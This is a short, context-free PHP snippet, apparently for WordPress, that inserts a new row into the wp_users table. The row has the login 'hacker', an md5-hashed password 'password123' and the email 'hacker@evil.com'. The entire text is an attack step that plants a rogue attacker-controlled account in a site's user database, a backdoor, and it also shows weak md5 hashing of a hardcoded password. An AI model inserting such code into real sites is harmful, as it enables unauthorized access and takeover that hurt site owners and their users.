$wpdb->insert('wp_users', array(
    'user_login' => 'hacker',
    'user_pass' => md5('password123'),
    'user_email' => 'hacker@evil.com'
));